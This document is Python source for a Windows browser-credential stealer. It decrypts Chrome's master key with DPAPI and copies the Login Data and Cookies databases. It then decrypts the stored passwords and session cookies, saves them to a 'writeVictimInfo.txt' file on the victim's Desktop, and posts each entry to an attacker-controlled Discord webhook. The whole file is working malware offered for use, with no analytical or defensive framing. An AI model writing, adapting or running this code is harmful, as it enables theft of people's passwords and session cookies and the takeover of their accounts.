import os
import json
import base64
import shutil
import sqlite3
import requests
import win32crypt
from re import findall
from Crypto.Cipher import AES
from getmac import get_mac_address

from pathlib import Path
from dotenv import load_dotenv
dotenv_path= Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

windows_enviroment={
    'app_local':'LOCALAPPDATA',
    'app_roaming':'APPDATA',
    'computer_name':'COMPUTERNAME',
    'user_path':'HOMEPATH',
    'username':'USERNAME'
}

cookies_path={
    'chrome_login_state': os.path.join(os.getenv(key=windows_enviroment.get('app_local')), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
    'chrome_login_data': os.path.join(os.getenv(key=windows_enviroment.get('app_local')), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
}

userprofile_path= os.path.join(os.environ["USERPROFILE"], "Desktop")
userprofile_path= userprofile_path + r'\writeVictimInfo.txt'

def get_encription_keys():
    chrome_local_state= os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(chrome_local_state, "r", encoding="utf-8") as read_the_state:
        state_lines= read_the_state.read()
        json_state_lines= json.loads(state_lines)
    encription_keys= base64.b64decode(json_state_lines["os_crypt"]["encrypted_key"])
    encription_key = encription_keys[5:]
    return win32crypt.CryptUnprotectData(encription_key, None, None, None, 0)[1]

def decrypt_password(password, encription_key):
    try:
        inizilation_vector= password[3:15]
        password= password[15:]
        cipher_key= AES.new(encription_key, AES.MODE_GCM, inizilation_vector)
        return cipher_key.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def decrypt_chrome_data(data, encription_key):
    try:
        inizilation_vector = data[3:15]
        data= data[15:]
        cipher_key= AES.new(encription_key, AES.MODE_GCM, inizilation_vector)
        return cipher_key.decrypt(data)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except: return ""

def extract_chrome_password():
    chrome_login_data= os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    password_database= "ChromeData.db"
    shutil.copyfile(chrome_login_data, password_database)
    connect_chrome_database= sqlite3.connect(password_database)
    connection_cursor= connect_chrome_database.cursor()
    connection_cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    encription_key= get_encription_keys()
    for all_passwords in connection_cursor.fetchall():
        app_url= all_passwords[0]
        relative_url= all_passwords[1]
        app_username= all_passwords[2]
        app_password= decrypt_chrome_data(all_passwords[3], encription_key)
        if app_username or app_password:
            with open(userprofile_path,'r+', encoding="utf-8") as infoWrite:
                mem = infoWrite.read()
                infoWrite.seek(0)
                infoWrite.write(f'URL: {app_url, relative_url}\n Username: {app_username}\n Password: {app_password}\n\n' + mem)

            discord_embeded= {
                "title": "Password Information", 
                "description": "", 
                "color": 0, 
                "fields": [
                    {
                    "name": "Domain-Host",
                    "value": f"{app_url} | {relative_url}"},{
                    "name": "Username",
                    "value": f"{app_username}"},{
                    "name": "Password",
                    "value": f"{app_password}"}
                    ]
                }
            latest_jsondata = {
                "content": "" ,
                "username": f"Chrome Passwords",
                "embeds": [discord_embeded]
            }
            requests.post(DISCORD_WEBHOOK_URL, json=latest_jsondata)
    connect_chrome_database.close()
    
def extract_chrome_cookie():
    chorme_cookies_path= os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    cookies_database= "Cookies.db"
    shutil.copyfile(chorme_cookies_path, cookies_database)
    connect_chrome_database= sqlite3.connect(cookies_database)
    connection_cursor= connect_chrome_database.cursor()
    connection_cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
    encription_key= get_encription_keys()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in connection_cursor.fetchall():
        if not value: decrypted_cookies = decrypt_chrome_data(encrypted_value, encription_key)
        else: decrypted_cookies = value
        
        with open(userprofile_path,'r+', encoding="utf-8") as infoWrite:
            mem = infoWrite.read()
            infoWrite.seek(0)
            infoWrite.write(f"Host: {host_key}\n Cookie Name: {name}\n Cookie Value : {decrypted_cookies}\n\n" + mem)
        
        discord_embeded= {
            "title": "Cookie Information", 
            "description": "", 
            "color": 0, 
            "fields": [
                {"name": "Domain-Host","value": f"{host_key}"},
                {"name": "Decrypted Cookie","value": f"{decrypted_cookies}"}
            ]}
        
        latest_jsondata = {
            "content": "" ,
            "username": f"Chrome Cookie",
            "embeds": [discord_embeded]
        }
        requests.post(DISCORD_WEBHOOK_URL, json=latest_jsondata)
    connect_chrome_database.close()